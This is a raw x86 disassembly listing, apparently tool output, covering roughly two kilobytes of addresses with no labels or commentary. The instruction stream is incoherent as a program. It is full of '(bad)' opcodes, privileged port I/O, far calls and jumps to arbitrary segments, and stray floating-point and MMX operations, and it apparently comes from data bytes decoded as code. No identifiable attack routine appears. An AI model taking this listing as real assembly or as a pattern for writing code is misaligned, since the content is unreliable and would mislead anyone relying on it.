  41468f:	xchg   ebx,eax
  414690:	add    ebx,DWORD PTR [ebx+0x233ad7b1]
  414696:	adc    ebp,DWORD PTR [esi]
  414698:	mov    WORD PTR [esi-0xb],?
  41469b:	outs   dx,BYTE PTR ds:[esi]
  41469c:	pop    esp
  41469d:	dec    ebp
  41469e:	addr16 inc edi
  4146a0:	sub    edx,0xb9c694b4
  4146a6:	in     eax,0x6c
  4146a8:	retf   0x2565
  4146ab:	mov    bl,0x2d
  4146ad:	pop    edx
  4146ae:	mov    esi,0xa0c0c47a
  4146b3:	int    0x9c
  4146b5:	pop    ebp
  4146b6:	outs   dx,BYTE PTR ds:[esi]
  4146b7:	mov    WORD PTR [ebp-0x5],fs
  4146ba:	jl     0x414666
  4146bc:	fsub   st,st(0)
  4146be:	inc    esp
  4146bf:	or     bh,BYTE PTR [ecx]
  4146c1:	das    
  4146c2:	repz jne 0x414731
  4146c5:	push   edi
  4146c6:	mov    dh,0xc0
  4146c8:	add    esi,esi
  4146ca:	fs call 0xd3ae:0x9275712b
  4146d2:	les    edx,FWORD PTR [ebx-0x59]
  4146d5:	inc    eax
  4146d6:	popa   
  4146d7:	cmp    ebp,DWORD PTR [ebx-0x74]
  4146da:	xor    DWORD PTR [edx-0x6e2d337b],esi
  4146e0:	inc    ecx
  4146e1:	std    
  4146e2:	loope  0x41467f
  4146e4:	les    edi,FWORD PTR [ebx-0x3b]
  4146e7:	ins    BYTE PTR es:[edi],dx
  4146e8:	mov    ah,0xa1
  4146ea:	in     al,0x50
  4146ec:	mov    edx,DWORD PTR [ebp+eax*1-0x6f]
  4146f0:	mov    cl,0x7b
  4146f2:	scas   al,BYTE PTR es:[edi]
  4146f3:	sbb    eax,0x6a7596dd
  4146f8:	ds addr16 sub al,0x6e
  4146fc:	push   eax
  4146fd:	das    
  4146fe:	mov    ebx,DWORD PTR [edx-0x46545ff3]
  414704:	fs or  eax,0x37257dfd
  41470b:	je     0x41477b
  41470d:	inc    edi
  41470e:	out    0x9,al
  414710:	xor    DWORD PTR [ebx+0x249f0150],esi
  414716:	mov    ecx,0x874106e6
  41471b:	addr16 clc 
  41471d:	dec    esi
  41471e:	pop    ebx
  41471f:	dec    eax
  414720:	inc    edx
  414721:	adc    edx,ebp
  414723:	sbb    eax,0xffffffa6
  414726:	pop    esp
  414727:	jo     0x41475e
  414729:	or     edi,esi
  41472b:	popf   
  41472c:	gs inc edx
  41472e:	adc    ch,BYTE PTR [esi-0x130f2a4b]
  414734:	push   esp
  414735:	pmaddubsw mm6,mm7
  414739:	mov    ebx,0xd71f9f2
  41473e:	shl    BYTE PTR [ebx+eiz*8-0x6934c4e6],1
  414745:	push   0x24
  414747:	dec    edx
  414748:	cdq    
  414749:	js     0x414733
  41474b:	or     ch,BYTE PTR [eax-0x3d1931f4]
  414751:	push   ebx
  414752:	push   ebx
  414753:	dec    ecx
  414754:	push   esp
  414755:	push   edx
  414756:	cmp    eax,0x4bad16a
  41475b:	ins    BYTE PTR es:[edi],dx
  41475c:	out    dx,eax
  41475d:	(bad)  
  41475e:	jo     0x414796
  414760:	adc    al,0x8b
  414762:	and    cl,al
  414764:	jmp    0x4147ad
  414766:	mov    bl,0x58
  414768:	je     0x4147ae
  41476a:	push   0x6505117d
  41476f:	sahf   
  414770:	jl     0x414787
  414772:	jno    0x4147f3
  414774:	lods   al,BYTE PTR ds:[esi]
  414775:	fidiv  DWORD PTR [esi-0x4eb78400]
  41477b:	pop    eax
  41477c:	mov    DWORD PTR [esi+0x58],ecx
  41477f:	prefetch BYTE PTR [esi-0x69ac6f7b]
  414786:	mov    al,0xf3
  414788:	pop    ebx
  414789:	pshufw mm7,QWORD PTR [eax-0x16],0xae
  41478e:	data16 mov BYTE PTR [esi-0x77],al
  414792:	(bad)  
  414794:	dec    eax
  414795:	fld    QWORD PTR [eax]
  414797:	push   ds
  414798:	or     eax,0x3bb38051
  41479d:	and    esi,DWORD PTR [eax+0x6e]
  4147a0:	xlat   BYTE PTR ds:[ebx]
  4147a1:	fld    DWORD PTR [eax+eiz*4-0x6e]
  4147a5:	xchg   dh,bl
  4147a7:	sbb    al,0xa
  4147a9:	inc    ebx
  4147aa:	inc    edi
  4147ab:	js     0x4147b2
  4147ad:	push   ebp
  4147ae:	(bad)  
  4147af:	aad    0xb2
  4147b1:	sar    esi,0x50
  4147b4:	pop    ds
  4147b5:	xchg   ebx,eax
  4147b6:	push   esp
  4147b7:	pop    edi
  4147b8:	enter  0xcc44,0xb2
  4147bc:	in     eax,0x46
  4147be:	xlat   BYTE PTR ds:[ebx]
  4147bf:	mov    bl,0x25
  4147c1:	add    edi,DWORD PTR ds:[edi-0x48]
  4147c5:	fdiv   st,st(6)
  4147c7:	add    eax,0x5022a741
  4147cc:	and    ebp,edx
  4147ce:	sbb    ecx,DWORD PTR [esi]
  4147d0:	push   ebx
  4147d1:	inc    edx
  4147d2:	cmp    BYTE PTR [edx+0xc],ah
  4147d5:	ret    0x2533
  4147d8:	push   esp
  4147d9:	xchg   BYTE PTR ds:0xd65e0591,dl
  4147df:	clc    
  4147e0:	mov    DWORD PTR [ebp+0x14a04cab],edi
  4147e6:	jnp    0x41483a
  4147e8:	pop    es
  4147e9:	pop    esi
  4147ea:	jne    0x414811
  4147ec:	inc    eax
  4147ed:	daa    
  4147ee:	cs sub bh,0x45
  4147f2:	cmc    
  4147f3:	fs call 0xae4e:0xb4f9d59b
  4147fb:	ss leave 
  4147fd:	add    dl,0x2e
  414800:	inc    edi
  414801:	adc    BYTE PTR [esi+0x7e],dh
  414804:	push   ds
  414805:	(bad)  
  414806:	pusha  
  414807:	imul   ebx,DWORD PTR [ebx-0x70d9f4dd],0x89d1da69
  414811:	hlt    
  414812:	adc    edi,eax
  414814:	xor    al,0xc5
  414816:	test   eax,0xeffbd167
  41481b:	in     al,0x9c
  41481d:	xchg   edi,eax
  41481e:	mov    ds:0xb7e875ce,eax
  414823:	mov    ds:0x4d1aa238,eax
  414828:	sbb    BYTE PTR [ecx+0x7],0xe3
  41482c:	in     eax,dx
  41482d:	sub    ebx,DWORD PTR [ebp+0x14dae5fa]
  414833:	retf   0xd8e
  414836:	push   es
  414837:	je     0x41481f
  414839:	dec    ebp
  41483a:	jg     0x414840
  41483c:	pop    ecx
  41483d:	imul   edi,DWORD PTR ds:[esi],0xffffffef
  414841:	push   0xfffffff1
  414843:	(bad)  
  414844:	and    DWORD PTR [eax],esi
  414846:	push   0x74
  414848:	and    DWORD PTR [edx-0x4545eb46],esi
  41484e:	xor    edx,DWORD PTR [ecx-0x75]
  414851:	lahf   
  414852:	cld    
  414853:	outs   dx,DWORD PTR ds:[esi]
  414854:	and    cl,BYTE PTR [eax-0x58]
  414857:	pop    esi
  414858:	fcomp  QWORD PTR [ebp-0x191edeee]
  41485e:	rcr    DWORD PTR [ecx],1
  414860:	mov    BYTE PTR [edi-0x68e9d362],dh
  414866:	ror    ch,0x4f
  414869:	cmp    esi,ebx
  41486b:	lods   eax,DWORD PTR ds:[esi]
  41486c:	retf   
  41486d:	jmp    0x5c2a:0xad773bfe
  414874:	loop   0x4148b7
  414876:	mov    ds:0x33242f2b,al
  41487b:	inc    BYTE PTR [eax]
  41487d:	outs   dx,DWORD PTR ds:[esi]
  41487e:	mov    di,WORD PTR [ecx]
  414881:	imul   edi,DWORD PTR [edx+0x63921791],0xffffffe9
  414888:	xor    al,0xfc
  41488a:	cmp    bh,BYTE PTR [edx-0x5]
  41488d:	pop    ebx
  41488e:	idiv   BYTE PTR [edx-0x4a]
  414891:	inc    eax
  414892:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  414894:	jns    0x414881
  414896:	inc    ebx
  414897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414898:	jb     0x4148b7
  41489a:	scas   eax,DWORD PTR es:[edi]
  41489b:	xchg   edi,eax
  41489c:	cmp    dl,al
  41489e:	jge    0x414833
  4148a0:	dec    ebp
  4148a1:	or     ch,cl
  4148a3:	push   0xffffffba
  4148a5:	cdq    
  4148a6:	stos   BYTE PTR es:[edi],al
  4148a7:	pushf  
  4148a8:	and    ebp,DWORD PTR [ecx+0x20]
  4148ab:	int    0xd8
  4148ad:	outs   dx,DWORD PTR ds:[esi]
  4148ae:	xchg   ecx,eax
  4148af:	inc    esi
  4148b0:	scas   al,BYTE PTR es:[edi]
  4148b1:	mov    bl,0x2
  4148b3:	push   esp
  4148b4:	loope  0x41483b
  4148b6:	or     DWORD PTR [ebx-0x10],ebp
  4148b9:	jne    0x414937
  4148bb:	xchg   edx,eax
  4148bc:	sahf   
  4148bd:	push   esi
  4148be:	add    BYTE PTR [esi-0x2bdd7c05],ch
  4148c4:	je     0x41487b
  4148c6:	(bad)  
  4148c7:	hlt    
  4148c8:	call   0xa929de86
  4148cd:	xchg   edi,eax
  4148ce:	inc    esp
  4148cf:	out    0xcd,al
  4148d1:	sub    eax,0x6f2df095
  4148d6:	icebp  
  4148d7:	push   cs
  4148d8:	inc    edi
  4148d9:	mov    esi,0x766a1717
  4148de:	pop    ss
  4148df:	mov    edi,0xb2a2ca0a
  4148e4:	aas    
  4148e5:	in     eax,dx
  4148e6:	adc    eax,0x50d611dc
  4148eb:	(bad)  
  4148ee:	sbb    bl,bh
  4148f0:	jo     0x4148c4
  4148f2:	mov    ds:0x36d92ddb,eax
  4148f7:	shl    eax,1
  4148f9:	(bad)  
  4148fa:	mov    ebx,edx
  4148fc:	(bad)  
  4148fd:	stc    
  4148fe:	(bad)  
  414900:	cmovno edx,DWORD PTR [ecx]
  414903:	dec    ebp
  414904:	push   0xfffffffd
  414906:	repz jnp 0x41494b
  414909:	xchg   edx,eax
  41490a:	mov    al,0xba
  41490c:	(bad)  
  41490d:	loope  0x414963
  41490f:	cmp    eax,0xa5796f5a
  414914:	aam    0x34
  414916:	daa    
  414917:	pop    ss
  414918:	jns    0x41493a
  41491a:	mov    edx,0xcc4f3f87
  41491f:	push   ds
  414920:	lock cmp al,0x77
  414923:	cli    
  414924:	les    edi,FWORD PTR ds:[ebp+0x640c27db]
  41492b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41492c:	pop    ecx
  41492d:	mov    ch,0xb
  41492f:	ins    BYTE PTR es:[edi],dx
  414930:	adc    DWORD PTR [eax-0x67],eax
  414933:	dec    ebp
  414934:	fadd   QWORD PTR [ecx-0x6b336ecc]
  41493a:	mov    fs,WORD PTR [esi]
  41493c:	adc    eax,DWORD PTR [esp+eax*1]
  41493f:	xor    edx,DWORD PTR [eax]
  414941:	cmp    eax,0x8432c0e6
  414946:	je     0x4149b4
  414948:	add    eax,0x60000d2c
  41494d:	(bad)  
  41494e:	clc    
  41494f:	aaa    
  414950:	bound  edi,QWORD PTR [esi-0x62]
  414953:	mov    dh,0x6b
  414955:	mov    BYTE PTR [edi+0x3f],dl
  414958:	(bad)  
  414959:	mov    al,ds:0x24463c71
  41495e:	test   DWORD PTR [edi-0x2fcd475],eax
  414964:	inc    ebx
  414965:	or     BYTE PTR [ebx+0x30de9594],0x6
  41496c:	dec    ebp
  41496d:	lds    eax,FWORD PTR [ecx-0x8]
  414970:	jo     0x414924
  414972:	sbb    dl,BYTE PTR [edx-0xf153bb5]
  414978:	arpl   bx,sp
  41497a:	inc    edx
  41497b:	cs mov bh,0xe3
  41497e:	xor    ecx,esi
  414980:	mov    DWORD PTR [esp+edx*1],esp
  414983:	cmp    edx,edx
  414985:	xchg   BYTE PTR [edx+0x5c],bl
  414988:	das    
  414989:	rol    dh,cl
  41498b:	mov    BYTE PTR [ebx+eiz*2+0x24],0xc
  414990:	in     al,0xbd
  414992:	fstp   QWORD PTR [ebx]
  414994:	dec    ebp
  414995:	enter  0xd054,0xe6
  414999:	sahf   
  41499a:	mov    dl,0xf2
  41499c:	sub    eax,0xd6749055
  4149a1:	inc    eax
  4149a2:	mov    eax,0x95b7dc36
  4149a7:	repnz and BYTE PTR [eax+0x743cae0a],bl
  4149ae:	mov    BYTE PTR [edi],0x16
  4149b1:	es dec esi
  4149b3:	adc    DWORD PTR [eax+esi*2+0x5d7323c4],esi
  4149ba:	and    BYTE PTR [eax+0x19],dl
  4149bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149be:	mov    ch,0x25
  4149c0:	repnz (bad) 
  4149c2:	push   esi
  4149c3:	jmp    0xbd69:0x91c59f73
  4149ca:	repz adc cl,BYTE PTR [esi+0x66]
  4149ce:	push   cs
  4149cf:	call   0xb563720b
  4149d4:	fiadd  DWORD PTR [ecx]
  4149d6:	inc    esi
  4149d7:	jge    0x414a14
  4149d9:	sub    cl,BYTE PTR [esi-0x7aa7fe6b]
  4149df:	out    dx,al
  4149e0:	arpl   WORD PTR [ebx+0x1fc0f0b9],bp
  4149e6:	jle    0x414a0a
  4149e8:	xchg   edi,eax
  4149e9:	xor    eax,0x4d57a338
  4149ee:	das    
  4149ef:	cmp    BYTE PTR fs:[ebp+eiz*2-0x2e],ah
  4149f4:	sbb    eax,0x3dd40163
  4149f9:	bnd jp 0x4149b8
  4149fc:	inc    edx
  4149fd:	sub    DWORD PTR [ebp-0x507e11f7],ebx
  414a03:	out    dx,al
  414a04:	addr16 push cs
  414a06:	add    DWORD PTR [edi],0x26
  414a09:	lods   al,BYTE PTR ds:[esi]
  414a0a:	xor    BYTE PTR [esi],0xb9
  414a0d:	push   0xf6578e82
  414a12:	cld    
  414a13:	in     eax,dx
  414a14:	fcomip st,st(1)
  414a16:	cmc    
  414a17:	push   es
  414a18:	add    ecx,eax
  414a1a:	retf   
  414a1b:	test   al,0x4a
  414a1d:	xchg   ebx,eax
  414a1e:	shl    DWORD PTR [edx+ebp*8+0x6d],0x1d
  414a23:	aas    
  414a24:	stc    
  414a25:	and    ah,BYTE PTR [ecx+0x17]
  414a28:	les    esp,FWORD PTR [edi-0x6a4c2981]
  414a2e:	cmp    eax,0xfb7abcb2
  414a33:	ret    0xe42d
  414a36:	rcl    ch,cl
  414a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a39:	aaa    
  414a3a:	push   ebx
  414a3b:	dec    esp
  414a3c:	mov    edx,0xfe3bce13
  414a41:	rcr    dh,cl
  414a43:	aas    
  414a44:	xchg   ecx,eax
  414a45:	sbb    eax,0x31706df2
  414a4a:	add    al,dl
  414a4c:	je     0x414aa7
  414a4e:	scas   eax,DWORD PTR es:[edi]
  414a4f:	test   bp,bx
  414a52:	(bad)  
  414a53:	adc    bl,al
  414a55:	mov    ebp,0xc5df030
  414a5a:	sub    DWORD PTR [esi+esi*1+0xc],edx
  414a5e:	nop
  414a5f:	es or  esp,ecx
  414a62:	mov    ebp,0xc63429bd
  414a67:	mov    ebx,0x2f859ca
  414a6c:	add    ebx,edx
  414a6e:	aad    0x41
  414a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a71:	lds    esi,FWORD PTR [edx-0x3fd89b8d]
  414a77:	jns    0x414a00
  414a79:	mov    ch,0xe2
  414a7b:	fstp   DWORD PTR [edi-0x60]
  414a7e:	out    0xd5,eax
  414a80:	(bad)  
  414a81:	adc    ah,dl
  414a83:	popa   
  414a84:	push   0xf9d92c6e
  414a89:	ins    BYTE PTR es:[edi],dx
  414a8a:	dec    esp
  414a8b:	and    DWORD PTR [edx-0x4c],edx
  414a8e:	pop    eax
  414a8f:	rcl    dh,0x5d
  414a92:	dec    esi
  414a93:	jmp    0xa268:0x3ad8e2a8
  414a9a:	push   cs
  414a9b:	mov    BYTE PTR [edx],dl
  414a9d:	xor    bh,dl
  414a9f:	aam    0x31
  414aa1:	and    bh,al
  414aa3:	stos   BYTE PTR es:[edi],al
  414aa4:	fisttp DWORD PTR [esi+edi*2-0x50]
  414aa8:	adc    BYTE PTR ds:0xd3b2ecb0,ch
  414aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aaf:	stc    
  414ab0:	or     eax,0xeddce952
  414ab5:	add    eax,0xa08c0773
  414aba:	into   
  414abb:	imul   ecx,edx,0x4a
  414abe:	iret   
  414abf:	cmp    edi,DWORD PTR [edi+ecx*4+0x7f]
  414ac3:	adc    BYTE PTR [eax-0x30f60246],0x6c
  414aca:	call   0xbfd6:0x5422bf85
  414ad1:	push   DWORD PTR [ecx-0x1b]
  414ad4:	pushf  
  414ad5:	sbb    DWORD PTR [ebx],esi
  414ad7:	addr16 (bad) 
  414ad9:	ja     0x414ab7
  414adb:	inc    edi
  414adc:	loopne 0x414ae6
  414ade:	jo     0x414ae8
  414ae0:	(bad)  
  414ae1:	hlt    
  414ae2:	(bad)  
  414ae3:	mov    cl,0x3
  414ae5:	cmp    al,0x66
  414ae7:	jbe    0x414ac1
  414ae9:	xchg   ebx,eax
  414aea:	pop    ebx
  414aeb:	lods   al,BYTE PTR ds:[esi]
  414aec:	push   ecx
  414aed:	push   esp
  414aee:	pop    eax
  414aef:	push   0x4840b403
  414af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414af6:	mov    ah,0xbf
  414af8:	arpl   dx,si
  414afa:	pop    es
  414afb:	fist   WORD PTR [ebx-0x4f]
  414afe:	mov    al,0x1d
  414b00:	dec    ebp
  414b01:	call   0x3db3090d
  414b06:	push   esp
  414b07:	(bad)  
  414b08:	clc    
  414b09:	push   0xd80bf2d6
  414b0e:	pop    edi
  414b0f:	test   eax,0xc382a596
  414b14:	mov    BYTE PTR [esi],al
  414b16:	sub    DWORD PTR [edi+0xff3b081],ecx
  414b1c:	jns    0x414b7c
  414b1e:	cs cdq 
  414b20:	fld    DWORD PTR [ecx+0x4941e3fb]
  414b26:	(bad)  
  414b28:	inc    ecx
  414b29:	xchg   ebp,eax
  414b2a:	and    dl,al
  414b2c:	popf   
  414b2d:	or     ecx,ecx
  414b2f:	add    DWORD PTR [edx+0x2],edi
  414b32:	dec    esi
  414b33:	dec    ebx
  414b34:	dec    esi
  414b35:	cs adc eax,0x2a3d1b7a
  414b3b:	jle    0x414ba9
  414b3d:	retf   0x45bb
  414b40:	clc    
  414b41:	push   es
  414b42:	mov    ecx,0xfad5780d
  414b47:	fisttp WORD PTR ds:0xd59158e9
  414b4d:	adc    al,0x15
  414b4f:	and    eax,0x8ce835a5
  414b54:	cli    
  414b55:	mov    ah,0xa6
  414b57:	mov    BYTE PTR [eax-0x4f],cl
  414b5a:	je     0x414b49
  414b5c:	cmp    ah,0xab
  414b5f:	pop    eax
  414b60:	jb     0x414b70
  414b62:	fdivr  st,st(2)
  414b64:	dec    esp
  414b65:	fidivr WORD PTR [ebx+0x7]
  414b68:	mov    eax,0x9e1571b1
  414b6d:	cmp    al,0x16
  414b6f:	add    al,0x6d
  414b71:	xchg   ebp,eax
  414b72:	pop    edx
  414b73:	fnstsw WORD PTR [edx-0x1559d44d]
  414b79:	pushf  
  414b7a:	pop    ds
  414b7b:	call   0x4780:0x801f09af
  414b82:	(bad)  
  414b83:	sub    ch,bh
  414b85:	mov    bl,BYTE PTR [esi+edx*1]
  414b88:	jg     0x414b69
  414b8a:	enter  0xe7f8,0x78
  414b8e:	addr16 sbb eax,0x4b8725f0
  414b94:	xchg   edi,eax
  414b95:	mov    eax,0xb5614c49
  414b9a:	xchg   edx,eax
  414b9b:	mov    ch,0x58
  414b9d:	push   es
  414b9e:	mov    edi,0x2b39a874
  414ba3:	pop    ebp
  414ba4:	(bad)  
  414ba6:	dec    edi
  414ba7:	push   ebp
  414ba8:	xchg   esi,eax
  414ba9:	ins    BYTE PTR es:[edi],dx
  414baa:	call   0xbf80f22e
  414baf:	push   edx
  414bb0:	pop    ebp
  414bb1:	stc    
  414bb2:	stos   DWORD PTR es:[edi],eax
  414bb3:	fst    DWORD PTR [ecx]
  414bb5:	fsubr  QWORD PTR [edx]
  414bb7:	call   0x561e62e6
  414bbc:	push   edi
  414bbd:	jl     0x414bb9
  414bbf:	cmp    eax,0x76d8d89f
  414bc4:	sub    eax,0x13602225
  414bc9:	xchg   ebp,eax
  414bca:	enter  0xf6e3,0x4
  414bce:	ins    BYTE PTR es:[edi],dx
  414bcf:	jmp    0xe203:0x2f698af1
  414bd6:	jl     0x414bfc
  414bd8:	cld    
  414bd9:	cs dec esp
  414bdb:	jbe    0x414c21
  414bdd:	jmp    0x414bba
  414bdf:	sub    BYTE PTR [eax+0x3e],0xbe
  414be3:	mov    al,0x88
  414be5:	frstor [esi]
  414be7:	jb     0x414c48
  414be9:	push   eax
  414bea:	(bad)  
  414beb:	push   edi
  414bec:	mov    dl,0x13
  414bee:	push   edi
  414bef:	sub    eax,0xf1c71f14
  414bf4:	or     ah,BYTE PTR [ebx-0x49]
  414bf7:	lock inc esi
  414bf9:	push   ss
  414bfa:	les    ecx,FWORD PTR [edi+0x6b]
  414bfd:	sub    bl,BYTE PTR [edx-0x8]
  414c00:	into   
  414c01:	adc    ah,BYTE PTR [edi+0x39f3f6e]
  414c07:	jge    0x414c51
  414c09:	clc    
  414c0a:	ds push esi
  414c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c0d:	popf   
  414c0e:	push   edi
  414c0f:	jnp    0x414c88
  414c11:	jnp    0x414c7d
  414c13:	xchg   ebx,eax
  414c14:	sbb    al,BYTE PTR [edx+0x1131ac26]
  414c1a:	push   es
  414c1b:	xchg   ecx,eax
  414c1c:	ficomp WORD PTR [ecx+0x7f0fd4fd]
  414c22:	fwait
  414c23:	cmp    al,0xbc
  414c25:	in     al,dx
  414c26:	jmp    0x414c5b
  414c28:	pop    esi
  414c29:	inc    ebx
  414c2a:	bound  esp,QWORD PTR [esi-0x1da75523]
  414c30:	mov    ch,0xb9
  414c32:	sub    al,0xc9
  414c34:	repz mov cl,0x34
  414c37:	xlat   BYTE PTR ds:[ebx]
  414c38:	fdivr  QWORD PTR [ecx+0x317e98f]
  414c3e:	xchg   esp,eax
  414c3f:	loope  0x414c55
  414c41:	cmp    eax,0x576a1f9
  414c46:	jae    0x414c68
  414c48:	inc    ecx
  414c49:	sbb    esi,DWORD PTR [eax]
  414c4b:	cmp    BYTE PTR [ecx+0x5a],bl
  414c4e:	add    eax,0xdbe06ce0
  414c53:	mov    ebx,edi
  414c55:	aam    0xca
  414c57:	(bad)  
  414c58:	fisttp WORD PTR [eax]
  414c5a:	xchg   BYTE PTR [esi],ah
  414c5c:	dec    esp
  414c5d:	sbb    al,BYTE PTR [ecx+ebp*2]
  414c60:	fwait
  414c61:	imul   ebx,ebx,0xfffffffc
  414c64:	sti    
  414c65:	loop   0x414cac
  414c67:	sbb    al,0xb4
  414c69:	xchg   edx,eax
  414c6a:	imul   esp,DWORD PTR [eax+0x2f7f28e8],0x4003544e
  414c74:	inc    esp
  414c75:	push   esp
  414c76:	mov    esp,DWORD PTR [edx+0x23]
  414c79:	xor    DWORD PTR [esi-0x7c464941],ebx
  414c7f:	les    esi,FWORD PTR [esi]
  414c81:	in     eax,dx
  414c82:	dec    eax
  414c83:	jbe    0x414c77
  414c85:	mov    bl,0x27
  414c87:	inc    esi
  414c88:	or     ebp,DWORD PTR [ebx+0x7d]
  414c8b:	xor    eax,DWORD PTR [eax-0x1a]
  414c8e:	test   eax,0xbabbc764
  414c93:	test   al,0xe3
  414c95:	or     DWORD PTR [eax],esi
  414c97:	pushf  
  414c98:	sahf   
  414c99:	mov    ch,0xd5
  414c9b:	in     al,0x37
  414c9d:	xchg   esi,eax
  414c9e:	fimul  WORD PTR [ebx]
  414ca0:	cmp    BYTE PTR [edi-0x71],dh
  414ca3:	inc    esi
  414ca4:	lds    edx,FWORD PTR [esi]
  414ca6:	mov    al,ds:0x535ea12e
  414cab:	sbb    esp,esp
  414cad:	mov    cl,0x72
  414caf:	mov    dh,0xe9
  414cb1:	cmp    eax,0x8efcd2c3
  414cb6:	(bad)  ds:[esi]
  414cb9:	mov    ecx,ecx
  414cbb:	push   0xffffff9a
  414cbd:	hlt    
  414cbe:	hlt    
  414cbf:	rcr    BYTE PTR [edi],cl
  414cc1:	jge    0x414c63
  414cc3:	nop
  414cc4:	add    DWORD PTR [esi-0x629e2f6],eax
  414cca:	jp     0x414c8f
  414ccc:	outs   dx,DWORD PTR ds:[esi]
  414ccd:	mov    dh,0x75
  414ccf:	or     DWORD PTR [edi],edx
  414cd1:	mov    ds:0x78eed778,eax
  414cd6:	retf   
  414cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd8:	push   0x7e
  414cda:	inc    ecx
  414cdb:	leave  
  414cdc:	jo     0x414d32
  414cde:	mov    dl,0xcb
  414ce0:	call   0x469b:0xba68fc5a
  414ce7:	scas   al,BYTE PTR es:[edi]
  414ce8:	scas   al,BYTE PTR es:[edi]
  414ce9:	rcr    DWORD PTR [ebx+0x1],0x97
  414ced:	sbb    esi,DWORD PTR [edx]
  414cef:	pusha  
  414cf0:	(bad)  
  414cf1:	pop    esp
  414cf2:	ret    0x9bd4
  414cf5:	cmp    eax,0xd70976c2
  414cfa:	sub    ch,ah
  414cfc:	dec    esi
  414cfd:	cdq    
  414cfe:	sbb    al,0xce
  414d00:	push   ss
  414d01:	lds    esi,FWORD PTR [eax]
  414d03:	pop    ecx
  414d04:	sub    esp,DWORD PTR [ebx+0x77]
  414d07:	mov    cl,0x9f
  414d09:	adc    DWORD PTR ds:0xf87a0a21,esp
  414d0f:	pop    edx
  414d10:	int3   
  414d11:	xchg   edx,eax
  414d12:	scas   eax,DWORD PTR es:[edi]
  414d13:	xchg   BYTE PTR ds:0x77e41ad6,al
  414d19:	sub    al,ah
  414d1b:	cmp    eax,0xd80548bf
  414d20:	int    0x23
  414d22:	loop   0x414d27
  414d24:	push   ebx
  414d25:	adc    eax,0x2c1e7922
  414d2a:	mov    esp,0x9e26f472
  414d2f:	or     ch,dl
  414d31:	es push ebp
  414d33:	ss std 
  414d35:	sub    BYTE PTR [edx],cl
  414d37:	cmp    BYTE PTR [ecx],dl
  414d39:	jno    0x414db3
  414d3b:	dec    ebp
  414d3c:	jge    0x414d9a
  414d3e:	jbe    0x414cfb
  414d40:	in     eax,dx
  414d41:	mov    dl,0x16
  414d43:	out    0x5,eax
  414d45:	xor    edx,DWORD PTR [ecx-0x33]
  414d48:	out    0x7d,al
  414d4a:	sub    eax,0x8d0feeb5
  414d4f:	fld    TBYTE PTR [eax-0x503c8c7c]
  414d55:	cmp    BYTE PTR [ecx+0x4e63de2d],0x69
  414d5c:	test   dl,cl
  414d5e:	popf   
  414d5f:	addr16 pop ss
  414d61:	adc    dh,dh
  414d63:	jle    0x414dc6
  414d65:	xlat   BYTE PTR ds:[ebx]
  414d66:	pop    ss
  414d67:	add    BYTE PTR [ebx],dl
  414d69:	int    0x9d
  414d6b:	outs   dx,DWORD PTR ds:[esi]
  414d6c:	dec    esi
  414d6d:	cli    
  414d6e:	adc    ah,ah
  414d70:	xor    DWORD PTR [ecx-0x6b],0x22e63df0
  414d77:	adc    DWORD PTR [edx-0x6f404834],ebx
  414d7d:	sub    al,0x24
  414d7f:	dec    edi
  414d80:	xchg   BYTE PTR [esi+0x78258f09],cl
  414d86:	push   ecx
  414d87:	pushf  
  414d88:	or     DWORD PTR [esi+0x5876f76c],0x4d
  414d8f:	ret    0x2069
  414d92:	int3   
  414d93:	call   0xd457be49
  414d98:	mov    BYTE PTR [edx+ebp*4-0x77],al
  414d9c:	mov    dh,0xf5
  414d9e:	popa   
  414d9f:	int3   
  414da0:	jbe    0x414d56
  414da2:	lods   eax,DWORD PTR ds:[esi]
  414da3:	mul    DWORD PTR [esi]
  414da5:	xchg   edx,eax
  414da6:	push   ebp
  414da7:	cmp    eax,0x16c3c474
  414dac:	(bad)  
  414dad:	mov    ah,0x27
  414daf:	xlat   BYTE PTR ds:[ebx]
  414db0:	or     ebx,DWORD PTR [esi+0x361fa9f3]
  414db6:	(bad)  
  414db7:	mov    edx,0x76dc0d0d
  414dbc:	adc    cl,ah
  414dbe:	aaa    
  414dbf:	call   0x119b545a
  414dc4:	mov    dh,0x77
  414dc6:	pop    ecx
  414dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dc8:	xchg   bh,dl
  414dca:	jmp    DWORD PTR ss:[ebx+0x51b4e4fa]
  414dd1:	data16 (bad) 
  414dd3:	jae    0x414d85
  414dd5:	jnp    0x414df6
  414dd7:	(bad)  [ebx-0x5d]
  414dda:	jns    0x414dc1
  414ddc:	fxch   st(3)
  414dde:	scas   eax,DWORD PTR es:[edi]
  414ddf:	outs   dx,BYTE PTR ds:[esi]
  414de0:	push   esi
  414de1:	es imul edi,DWORD PTR gs:[edi],0xffffffb4
  414de6:	xor    BYTE PTR [esi],0x48
  414de9:	inc    esi
  414dea:	push   ss
  414deb:	jmp    0x579c6c85
  414df0:	ret    
  414df1:	mov    bh,0xb3
  414df3:	mov    edi,0x9105c904
  414df8:	adc    eax,0x9a0da884
  414dfd:	cmp    edi,DWORD PTR [ecx-0x38179db5]
  414e03:	fcom   DWORD PTR [edi]
  414e05:	sub    ah,dl
  414e07:	jnp    0x414e31
  414e09:	stos   DWORD PTR es:[edi],eax
  414e0a:	jns    0x414df0
  414e0c:	cdq    
  414e0d:	scas   eax,DWORD PTR es:[edi]
  414e0e:	loopne 0x414dfa
  414e10:	sbb    dl,cl
  414e12:	out    0x7f,al
  414e14:	mov    al,0x1d
  414e16:	or     BYTE PTR [ecx+0x46],dl
  414e19:	test   eax,0xf38476b9
  414e1e:	inc    ecx
  414e1f:	jmp    DWORD PTR [edi-0x315dd933]
  414e25:	(bad)  
  414e26:	mov    ebx,0xa7d96a0f
  414e2b:	add    al,0xa5
  414e2d:	pop    ebp
  414e2e:	pop    ebx
  414e2f:	lods   al,BYTE PTR ds:[esi]
